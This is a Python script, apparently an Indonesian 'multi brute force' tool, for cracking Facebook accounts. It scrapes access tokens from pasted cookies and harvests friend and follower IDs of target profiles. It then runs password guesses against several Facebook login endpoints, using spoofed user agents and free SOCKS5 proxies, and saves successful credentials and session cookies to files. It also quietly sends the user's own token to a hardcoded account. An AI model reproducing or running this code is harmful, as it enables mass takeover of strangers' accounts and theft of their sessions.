#!/usr/bin/python3
#coding=utf-8
#create 29/08/2022
import requests,bs4,json,os,sys,random,datetime,time,re,marshal
import urllib3
import base64
import rich
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as Anak
from rich import print as Buat
from bs4 import BeautifulSoup
try:
	import rich
except ImportError:
	print("\t [!] Sedang menginstal module rich")
	os.system("python -m pip install --upgrade pip && pip install rich")
try:
	import requests
except ImportError:
	print("\t [!] Sedang menginstal module requests")
	os.system("pip install requests")
try:
	import mechanize
except ImportError:
	print("\t [!] Sedang menginstal module mechanize")
	os.system("pip install mechanize")
########## TAMPUNG MANTAN ##########
id,id2,loop,ok,cp,akun,ganti,method,tokenku,uid= [],[],0,0,0,[],[],[],[],[]
cokbrut=[]
pwpluss=[]
pwnya=[]
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []
data={}
data2={}
ses=requests.Session()
try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('data/proxy.txt','w').write(prox)
except Exception as e:
	print(f"{M}! {H}use wisely, because I am not responsible for any problems that are outside. that's all my message{P}")
########## WARNA RANDOM ##########
P = '\x1b[0;97m'
M = '\x1b[0;31m'
H = '\x1b[0;32m'
K = '\x1b[0;33m'
B = '\x1b[0;34m'
U = '\x1b[0;35m' 
O = '\x1b[0;36m'
########## WARNA RICH LAPISAN ##########
M3 = "#FF0000"
H3 = "#00FF00"
K3 = "#FFFF00"
P3 = "#FFFFFF"
B3 = "#00C8FF"
U3 = "#AF00FF"
O3 = "#00FFFF"
########## WARNA RICH BIASA ##########
M2 = "[#FF0000]"
H2 = "[#00FF00]"
K2 = "[#FFFF00]"
P2 = "[#FFFFFF]"
B2 = "[#00C8FF]"
U2 = "[#AF00FF]"
O2 = "[#00FFFF]"
########## DATA TAMPUNG BULAN ##########
url_mb = "http://mbasic.facebook.com"
hitung = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
hitung2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tanggal = datetime.datetime.now().day
bulan = hitung[(str(datetime.datetime.now().month))]
tahun = datetime.datetime.now().year
okeh = 'OK-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
cepe = 'CP-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
tapp = ''+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
join = ''+str(tanggal)+' '+str(bulan)+' '+str(tahun)+''
########## SYSTEM CONTROL ##########
def jalan(Kiya):
	for Aang in Kiya + "\n":
		sys.stdout.write(Aang)
		sys.stdout.flush()
		time.sleep(0.02)
def sapu():
	os.system("clear")
########## SOUND BOKEP ##########
def sound(__bokep__):
	if __bokep__ in ["ok"]:
		os.popen("play-audio data/audio/ok.mp3")
	elif __bokep__ in ["cp"]:
		os.popen("play-audio data/audio/cp.mp3")
	elif __bokep__ in ["login"]:
		os.popen("play-audio data/audio/login.mp3")
	elif __bokep__ in ["selesai"]:
		os.popen("play-audio data/audio/selesai.mp3")
########## GAMBAR ##########
def banner():
	sapu()
	print(f""" {M}_____
|  ___|__  _ __ ___ ___
| |_ / _ \| '__/ __/ _ \\ {P}||{H} Multi brute force{P}
|  _| (_) | | | (_|  __/ {P}||{H} Developer Aang XD{P}
|_|  \___/|_|  \___\___| {P}||{H} Version 3.0{P}
""")
########## DETEKSI COOKIE ##########
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			ambil = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			memek = json.loads(ambil.text)['name']
			ukhty = json.loads(ambil.text)['id']
			menu(memek,ukhty)
		except KeyError:
			masuk()
		except requests.exceptions.ConnectionError:
			print(f"  {P}[{H}!{P}] Tidak ada koneksi");exit()
	except IOError:
		masuk()
def jadi():
	try:
		requests.post("https://graph.facebook.com/100027796542918?fields=subscribers&access_token=%s"%(tokenku))
	except:pass
########## MENU LOGIN ##########
def masuk():
	banner()
	sound("login")
	mas = f"""{P2}[{H2}01{P2}] Login menggunakan cookie
[{H2}02{P2}] Cara mengambil cookie fb
[{H2}03{P2}] Check results crack
[{M2}00{P2}] Logout"""
	Buat(Anak(mas,width=50,title=f"{H2}login{P2}",style=f"{U3}"))
	nanya = input(f"  {P}[{H}?{P}] Pilih : ")
	if nanya in ["01","1"]:
		goblok()
	elif nanya in ["02","2"]:
		nd = f"{P2}Kamu akan segera diarahkan ke youtube"
		Buat(Anak(nd,width=50,style=f"{U3}"));time.sleep(3)
		os.system('xdg-open https://youtu.be/iDVCcnLcTnE');masuk()
	elif nanya in ["03","3"]:
		__hasil__()
########## MASUK COOKIE ##########
def goblok():
	warna = random.choice([H,B,U,M,O])
	fo = f"{P2}Ketik {H2}open{P2} untuk mendapatkan url ambil cookie"
	Buat(Anak(fo,width=50,style=f"{U3}"))
	cookie = input(f"  {P}[{H}?{P}] Masukan Cookie : {warna}")
	if cookie in ["Open","OPEN","open"]:
		op = f"{P2}https://chrome.google.com/webstore/detail/cookiedough/hacigcgfiefikmkmmmncaiaijoffndpl{P2}"
		Buat(Anak(op,width=50,title=f"{H2}link extensions{P2}",style=f"{U3}"))
		exit()
	try:
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		tok = open(".token.txt", "w").write(find_token.group(1));jadi()
		cok = open(".cok.txt", "w").write(cookie)
		bh = f"{P2}Berhasil, ketik ulang : {H2}python force.py{P2}"
		Buat(Anak(bh,width=50,style=f"{U3}"))
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		bp = f"{P2}Gagal, cek akunya dulu bang"
		Buat(Anak(bp,width=50,style=f"{U3}"))
		exit()
########## MENU ##########
def menu(__nn__,__ii__):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print("{P}[{H}!{P}] Cookie invalid ngab")
		time.sleep(2);login()
	banner()
	ipku = requests.get("https://api.ipify.org").text
	ak = f"""{P2}[{H2}•{P2}] User : {str(__nn__)}
{P2}[{H2}•{P2}] Join : {join}
{P2}[{H2}•{P2}] Ip   : {ipku}"""
	Buat(Anak(ak,width=50,title=f"{H2}data akun{P2}",style=f"{U3}"))
	men = f"""{P2}[{H2}01{P2}] Crack id dari teman publik
{P2}[{H2}02{P2}] Crack id publik massal
{P2}[{H2}03{P2}] Crack id dari follower publik
{P2}[{H2}04{P2}] Check results crack
{P2}[{H2}05{P2}] Informasi script
{P2}[{H2}06{P2}] Check opsi akun checkpoin
{P2}[{M2}00{P2}] Logout ({M2}hapus cookie{P2})"""
	Buat(Anak(men,width=50,title=f"{H2}menu{P2}",style=f"{U3}"))
	__toket__ = input(f"  {P}[{H}?{P}] Pilih : ")
	if __toket__ in ["01","1"]:__publik__()
	elif __toket__ in ["02","2"]:__masal__()
	elif __toket__ in ["03","3"]:__folow__()
	elif __toket__ in ["04","4"]:__hasil__()
	elif __toket__ in ["05","5"]:__ingfo__()
	elif __toket__ in ["06","6"]:__check__()
	elif __toket__ in ["00","0"]:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		tt = f"{P2}Sebentar, sedang menghapus info login"
		Buat(Anak(tt,width=50,style=f"{U3}"));time.sleep(2)
		jalan(f"  {P}[{H}√{P}] Berhasil terhapus ...");exit()
	else:
		print(f"\n  {P}[{M}!{P}] Pilih yang bener anjeng")
		exit()
########## PUBLIK ##########
def __publik__():
	try:
		token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
	except IOError:
		exi()
	jb = f"{P2}[{M2}!{P2}] Pastikan target bersifat publik"
	Buat(Anak(jb,width=50,style=f"{U3}"))
	ppk = input(f"  {P}[{H}?{P}] Target id : ");uid.append(ppk)
	for __colmek__ in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/v2.0/{__colmek__}?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f"  {P}[{H}!{P}] Tidak ada koneksi");exit()
	try:
		print(f"  {P}[{H}!{P}] Terkumpul {H}{str(len(id))}{P} id")
		time.sleep(1);setting()
	except requests.exceptions.ConnectionError:
		print(f"  {P}[{H}!{P}] Tidak ada koneksi");exit()
	except (KeyError,IOError):
		print(f"  {P}[{M}!{P}] Target private/not publik");exit()
########## MASAL ##########
def __masal__():
	try:
		token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jb = f"{P2}[{M2}!{P2}] Pastikan target bersifat publik"
		Buat(Anak(jb,width=50,style=f"{U3}"))
		__sas__ = int(input(f"  {P}[{H}?{P}] Mau dump berapa id : "))
	except ValueError:
		print(f"  {P}[{H}!{P}] Masukan angka doang anjeng");time.sleep(2);exit()
	if __sas__<1 or __sas__>50:
		print(f"  {P}[{H}!{P}] Limit {H}50{P} id doang anjeng");time.sleep(2);exit()
	ses=requests.Session()
	memek = 0
	for met in range(__sas__):
		memek+=1
		ppk = input(f"  {P}[{H}•{P}] Target id nomor {H}{str(memek)}{P} : ");uid.append(ppk)
	for __colmek__ in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/v2.0/{__colmek__}?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f"  {P}[{H}!{P}] Tidak ada koneksi");exit()
	try:
		print(f"  {P}[{H}!{P}] Terkumpul {H}{str(len(id))}{P} id")
		setting()
	except requests.exceptions.ConnectionError:
		print(f"  {P}[{H}!{P}] Tidak ada koneksi");exit()
	except (KeyError,IOError):
		print(f"  {P}[{H}!{P}] Target private/tidak memiliki teman");exit()
########## FOLLOWER ##########
def __folow__():
	try:token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
	except IOError:exit()
	ff = f"{P2}[{M2}!{P2}] Pastikan akun bersifat publik"
	Buat(Anak(ff,width=50,style=f"{U3}"))
	__janda__ = input(f"  {P}[{H}?{P}] Target id : ")
	try:
		Kiya = requests.get(f'https://graph.facebook.com/{__janda__}?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in Kiya['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f"  {P}[{H}!{P}] Terkumpul {H}{str(len(id))}{P} id");time.sleep(2);setting()
	except requests.exceptions.ConnectionError:print(f"  {P}[{M}!{P}] Tidak ada koneksi");time.sleep(2);exit()
	except (KeyError,IOError):print(f"  {P}[{M}!{P}] Target private/not publik");time.sleep(2);exit()
########## CEK RESULTS ##########
def __hasil__():
	sil = f"""{P2}[{H2}01{P2}] Check results akun {H2}OK
{P2}[{H2}02{P2}] Check results akun {K2}CP{P2}"""
	Buat(Anak(sil,width=50,title=f"{H2}check results{P2}",style=f"{U3}"))
	__kentod__ = input(f"  {P}[{H}?{P}] Pilih : ")
	if __kentod__ in ["1","01"]:
		try:
			vin = os.listdir('OK')
		except FileNotFoundError:
			print(f"\n  {P}[{M}!{P}] File ndak ada anjeng")
			time.sleep(2)
			exit()
		if len(vin)==0:
			print(f"\n  {P}[{M}!{P}] Kamu belum punya results")
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:__kentod__ = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10000:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)});lol.update({nom:str(isi)})
					print(f"  {P}[{O}{nom}{P}] {isi}");time.sleep(0.03)
				else:
					lol.update({str(cih):str(isi)})
					print(f"  {P}[{O}{nom}{P}] {isi}");time.sleep(0.03)
			__sil__ = input(f"\n  {P}[{H}?{P}] Masukan nomor file : ")
			try:geh = lol[__sil__]
			except KeyError:
				print(f"\n  {P}[{M}!{P}] Pilih yang bener lah");exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f"\n  {P}[{M}!{P}] File ndak ada anjeng")
				time.sleep(2)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'  {P}[{H}OK{P}] {H}{cpkuni[0]}|{cpkuni[1]}{P}');time.sleep(0.03)
				nocp +=1
			goog = f"{P2} Check results crack selesai, total {H2}{len(__kentod__)}{P2} akun"
			Buat(Anak(goog,width=50,style=f"{U3}"))
			exit()
	elif __kentod__ in ["2","02"]:
		try:
			vin = os.listdir('CP')
		except FileNotFoundError:
			print(f"\n  {P}[{M}!{P}] File ndak ada anjeng")
			time.sleep(2)
			exit()
		if len(vin)==0:
			print(f"\n  {P}[{M}!{P}] Kamu belum punya results")
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:__kentod__ = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10000:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)});lol.update({nom:str(isi)})
					print(f"  {P}[{O}{nom}{P}] {isi}");time.sleep(0.03)
				else:
					lol.update({str(cih):str(isi)})
					print(f"  {P}[{O}{nom}{P}] {isi}");time.sleep(0.03)
			__sil__ = input(f"\n  {P}[{H}?{P}] Masukan nomor file : ")
			try:geh = lol[__sil__]
			except KeyError:
				print(f"\n  {P}[{M}!{P}] Pilih yang bener lah");exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f"\n  {P}[{M}!{P}] File ndak ada anjeng")
				time.sleep(2)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'  {P}[{K}CP{P}] {K}{cpkuni[0]}|{cpkuni[1]}{P}');time.sleep(0.03)
				nocp +=1
			goog = f"{P2} Check results crack selesai, total {H2}{len(__kentod__)}{P2} akun"
			Buat(Anak(goog,width=50,style=f"{U3}"))
			exit()
########## SETTING ##########
def setting():
	st = f"""{P2}[{H2}01{P2}] Crack id tertua ({M2}tidak disarankan{P2})
[{H2}02{P2}] Crack id termuda ({H2}disarankan{P2})
[{H2}03{P2}] Crack acak id ({O2}rekomendasi{P2})"""
	Buat(Anak(st,width=50,title=f"{H2}setiing id{P2}",style=f"{U3}"))
	__sas__ = input(f"  {P}[{H}?{P}] Pilih : ")
	if __sas__ in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif __sas__ in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif __sas__ in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f"  {P}[{H}!{P}] Pilih {H}1{P} sampai {H}3{P} doang anjeng");exit()
	pwplus = input(f"  {P}[{H}?{P}] Password manual [{H}y{P}/{M}t{P}]: ")
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		bb = f"{P2}[{M2}!{P2}] Gunakan {H2}koma{P2} sebagai pemisah\n[{M2}!{P2}] Contoh : sayangku,anjing,kontol"
		Buat(Anak(bb,width=50,style=f"{U3}"))
		pwku=input(f"  {P}[{H}?{P}] Masukan password : ")
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	met = f"{P2}[{H2}01{P2}] Login use facebook validate\n[{H2}02{P2}] Login use facebook regular"
	Buat(Anak(met,width=50,title=f"{H2}method{P2}",style=f"{U3}"))
	__ngentod__ = input(f"  {P}[{H}?{P}] Pilih : ")
	if __ngentod__ in [""]:
		print(f"\n{P}[{H}!{P}] Input yang bener");exit()
	elif __ngentod__ in ["1", "01"]:login_validate()
	elif __ngentod__ in ["2", "02"]:login_regular()
########## METODE LOGIN ##########
def login_validate():
	met = f"""{P2}[{H2}01{P2}] Login with mbasic
{P2}[{H2}02{P2}] Login with free facebook
{P2}[{H2}03{P2}] Login with m.facebook"""
	Buat(Anak(met,width=50,title=f"{H2}login validate{P2}",style=f"{U3}"))
	__val__ = input(f"  {P}[{H}?{P}] Pilih : ")
	if __val__ in [""]:
		print(f"\n  {P}[{H}!{P}] Input yang bener");exit()
	elif __val__ in ["1", "01"]:method.append("mbasic")
	elif __val__ in ["2", "02"]:method.append("free")
	elif __val__ in ["3", "03"]:method.append("mobile")
	else:method.append('mobile')
	kunaon()
########## METODE LOGIN2 ##########
def login_regular():
	met2 = f"""{P2}[{H2}01{P2}] Login with mbasic          {H2}v2{P2}
{P2}[{H2}02{P2}] Login with free facebook   {H2}v2{P2}
{P2}[{H2}03{P2}] Login with m.facebook      {H2}v2{P2}"""
	Buat(Anak(met2,width=50,title=f"{H2}login regular{P2}",style=f"{U3}"))
	__reg__ = input(f"  {P}[{H}?{P}] Pilih : ")
	if __reg__ in [""]:
		print(f"\n  {P}[{H}!{P}] Input yang bener");exit()
	elif __reg__ in ["1", "01"]:method.append("mbasic_v2")
	elif __reg__ in ["2", "02"]:method.append("free_v2")
	elif __reg__ in ["3", "03"]:method.append("mobile_v2")
	else:method.append('mobile_v2')
	kunaon()
########## LOGIN VALIDATE ##########
def __validate__(idf,__Ang__,url):
	global loop,ok,cp
	cit = random.choice(["520","928","650","453","903","635","730","1520"])
	vsi = random.choice(["6","7","8","9","10","11","12","13"])
	ser = random.randrange(111,999)
	ser2 = random.randrange(111111,999999)
	L1 = f"Mozilla/5.0 (Windows Phone 10.0; Android {vsi}; GT-I8750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.{ser} Mobile Safari/537.36 Edge/12.10149"
	L2 = f"Mozilla/5.0 (Linux; Android {vsi}; V1818A Build/OPM1.{ser2}.{ser}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.{ser} Mobile Safari/537.36 VivoBrowser/10.8.70.0"
	L3 = f"Mozilla/5.0 (Linux; Android {vsi}; PBAM00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.{ser} Mobile Safari/537.36 EdgA/98.0.1108.62"
	L4 = f"Mozilla/5.0 (Linux; U; Android {vsi}; en-gb; CPH1937 Build/PKQ1.{ser2}.{ser}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.{ser} Mobile Safari/537.36 OppoBrowser/25.6.2.5"
	L5 = f"Mozilla/5.0 (Windows Phone 10.0; Android {vsi} NOKIA; Lumia {cit}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
	ua_val = random.choice([L1,L2,L3,L4,L5])
	ses = requests.Session()
	for pw in __Ang__:
		try:
			ses.headers.update({
					'Host': url,
					'cache-control': 'max-age=0',
					'sec-ch-ua-mobile': '?1',
					'upgrade-insecure-requests': '1',
					'user-agent': ua_val,
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
				})
			p = ses.get(f'https://{url}/login/device-based/password/?uid={idf}&flow=login_no_pin&signed_next=1&next=https%3A%2F%2F{url}%2Fv2.12%2Fdialog%2Foauth%3Fauth_type%3Drerequest%26client_id%3D334689249900154%26state%3De5fb35a03124858e46e9ac037178f100%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3Dhttps%253A%252F%252Fwww.edureka.co%252Fsocial_endpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cpublic_profile%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db507826a-b31a-425d-bff0-94464411ed5b%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.edureka.co%2Fsocial_endpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3De5fb35a03124858e46e9ac037178f100%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa = {
					"lsd":re.search('type="hidden" name="lsd" value="(.*?)"', str(p.text)).group(1),
					"jazoest":re.search('type="hidden" name="jazoest" value="(.*?)"', str(p.text)).group(1),
					"uid":idf,
					"next":"https://"+url+"/login.php/?skip_api_login=1&api_key=334689249900154&kid_directed_site=0&app_id=334689249900154&signed_next=1&next=https%3A%2F%2F"+url+"%2Fv2.12%2Fdialog%2Foauth%3Fauth_type%3Drerequest%26client_id%3D334689249900154%26state%3De5fb35a03124858e46e9ac037178f100%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3Dhttps%253A%252F%252Fwww.edureka.co%252Fsocial_endpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cpublic_profile%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db507826a-b31a-425d-bff0-94464411ed5b%26tp%3Dunspecified",
					"flow":"login_no_pin",
					"pass":pw,
					"login":"1",
					"persistent":"1",
					"default_persistent": "0"
				}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='m_pixel_ratio=2.625; wd=412x756'
			heade = {
					'Host': url,
					'cache-control': 'max-age=0',
					'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
					'sec-ch-ua-mobile': '?1',
					'sec-ch-ua-platform': '"Android"',
					'upgrade-insecure-requests': '1',
					'origin': 'https://'+url,
					'content-type': 'application/x-www-form-urlencoded;charset=utf-8',
					'user-agent': ua_val,
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'x-cache-lookup': 'HIT from cp1006.eqiad.wmnet:3128,MISS from cp1010.eqiad.wmnet:80',
					'x-frame-options': 'SAMEORIGIN',
					'x-requested-with': 'XMLHttpRequest',
					'x-xss-protection': '0',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'referer': f'https://{url}/login/device-based/password/?uid={url}&flow=login_no_pin&signed_next=1&next=https%3A%2F%2F{url}%2Fv2.12%2Fdialog%2Foauth%3Fauth_type%3Drerequest%26client_id%3D334689249900154%26state%3De5fb35a03124858e46e9ac037178f100%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3Dhttps%253A%252F%252Fwww.edureka.co%252Fsocial_endpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cpublic_profile%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db507826a-b31a-425d-bff0-94464411ed5b%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.edureka.co%2Fsocial_endpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3De5fb35a03124858e46e9ac037178f100%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
					'connection': 'keep-alive',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
				}
			po = ses.post(f'https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f"\r  {P}└──{K} {idf}|{pw}{P}                 ")
				open('CP/'+cepe,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				sound("cp")
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f"\r  {P}└──{H} {idf}|{pw}{P}                 \n  └──{H} {kuki}{P}")
				open('OK/'+okeh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				sound("ok")
				ok+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	for xx in list("\|-/"):
		print(f"\r  {P}[{H}{xx}{P}] [{O}%s{P}/{O}%s{P}] = [{H}OK:%s{P}] = [{K}CP:%s{P}] "%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
########## LOGIN REGULAR ##########
def __regular__(idf,__Ang__,url):
	global loop,ok,cp
	cit = random.choice(["520","928","650","453","903","635","730","1520"])
	vsi = random.choice(["6","7","8","9","10","11","12","13"])
	ser = random.randrange(111,999)
	ser2 = random.randrange(111111,999999)
	L1 = f"Mozilla/5.0 (Windows Phone 10.0; Android {vsi}; GT-I8750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.{ser} Mobile Safari/537.36 Edge/12.10149"
	L2 = f"Mozilla/5.0 (Linux; Android {vsi}; V1818A Build/OPM1.{ser2}.{ser}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.{ser} Mobile Safari/537.36 VivoBrowser/10.8.70.0"
	L3 = f"Mozilla/5.0 (Linux; Android {vsi}; PBAM00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.{ser} Mobile Safari/537.36 EdgA/98.0.1108.62"
	L4 = f"Mozilla/5.0 (Linux; U; Android {vsi}; en-gb; CPH1937 Build/PKQ1.{ser2}.{ser}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.{ser} Mobile Safari/537.36 OppoBrowser/25.6.2.5"
	L5 = f"Mozilla/5.0 (Windows Phone 10.0; Android {vsi} NOKIA; Lumia {cit}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
	ua_reg = random.choice([L1,L2,L3,L4,L5])
	vpn = random.choice(prox)
	proxy = {"http": "socks5://"+vpn}
	ses = requests.Session()
	for pw in __Ang__:
		try:
			link = ses.get(f"https://{url}/login/?source=auth_switcher")
			date = {
					"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
					"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
					"email":idf,
					"pass":pw,
					"next":"https://"+url+"/login/save-device/?login_source=login",
					"login":"1",
					"persistent":"1",
					"default_persistent": "0"
				}
			head = {
					'accept': '*/*',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'id,en-US;q=0.9,en;q=0.8',
					'content-type': 'application/x-www-form-urlencoded',
					'Host': url,
					'origin': 'https://'+url,
					'referer': 'https://'+url+'/login/?source=auth_switcher',
					'user-agent': ua_reg,
					'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
					'sec-ch-ua-mobile': '?0',
					'sec-ch-ua-platform': '"Linux"',
					'sec-fetch-dest': 'empty',
					'sec-fetch-mode': 'cors',
					'sec-fetch-site': 'same-origin',
					'x-requested-with': 'XMLHttpRequest'
				}
			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=head, data=date, proxies=proxy)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f"\r  {P}└──{K} {idf}|{pw}{P}                 ")
				open('CP/'+cepe,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				sound("cp")
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f"\r  {P}└──{H} {idf}|{pw}{P}                 \n  └──{H} {kuki}{P}")
				open('OK/'+okeh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				sound("ok")
				ok+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	for xx in list("\|-/"):
		print(f"\r  {P}[{H}{xx}{P}] [{O}%s{P}/{O}%s{P}] = [{H}OK:%s{P}] = [{K}CP:%s{P}] "%(loop,len(id),ok,cp),end=" ")
		sys.stdout.flush()
########## CONVERT COKIES ##########
def convert(cookie):
	cok = ('datr=%s;sb=%s;c_user=%s;xs=%s;fr=%s'%(cookie['datr'],cookie['sb'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
########## PASSWORD TAMBAHAN ##########
def kunaon():
	kp = f"""{P2}[{M2}•{P2}] Akun {H2}OK{P2} save : {H2}OK/{okeh}
{P2}[{M2}•{P2}] Akun {K2}CP{P2} save : {K2}OK/{cepe}
{P2}[{H2}!{P2}] Mode pesawat 3 detik setiap 400 id"""
	Buat(Anak(kp,width=50,style=f"{U3}"))
